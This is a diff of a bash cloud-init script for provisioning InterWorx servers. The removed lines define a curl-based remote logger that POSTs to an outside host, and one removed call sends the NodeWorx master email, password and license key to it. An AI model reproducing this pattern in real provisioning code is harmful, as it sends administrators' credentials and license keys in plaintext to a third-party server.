@@ -3,7 +3,7 @@
 # GLOBAL VARS
 declare -A INI_SECTION_USER_MAP
 IWORX_INI='/usr/local/interworx/iworx.ini'
-TMP_MYCNF='/root/.my.cnf.prov'
+TMP_MYCNF='/root/.my.prov.cnf'
 LOGFILE='/tmp/cloudinit.log'
 INI_SECTION_USER_MAP[vpopmail]='iworx_vpopmail'
 INI_SECTION_USER_MAP[proftpd]='iworx_ftp'
@@ -20,17 +20,6 @@ fi
 # Function for logging
 action_print() {
   echo -e "\033[93mACTION: \033[0m ${*}" | ts '%Y-%m-%d %H:%M:%S' | tee -a $LOGFILE
-}
-
-remote_log() {
-
-  local logger_id='CoollyTungstensTombstoneVulcanizers1449'
-  local topic=$1
-  shift
-  local message=$(echo -n "$*" | jq -sRr @uri)
-
-  curl -X POST 'https://b8abdb2900.nxcli.io/logger.php' -d "auth_id=${logger_id}&topic=${topic}&message=${message}"
-
 }
 
 # Interworx DB connection, uses Iworx root user so we don't
@@ -272,8 +261,6 @@ reset_nodeworx_info() {
     local nw_pass='{{ iw_master_password }}'
     local nw_license='{{ iw_license_key }}'
 
-    remote_log 'nodeworx_reset' "master email: ${nw_user} -- pass: ${nw_pass} -- key: ${nw_license}"
-    
     # Change password for master NW user to match what Nocworx gave us
     nodeworx --user-auth --non-interactive --verbose \
     --controller Users \
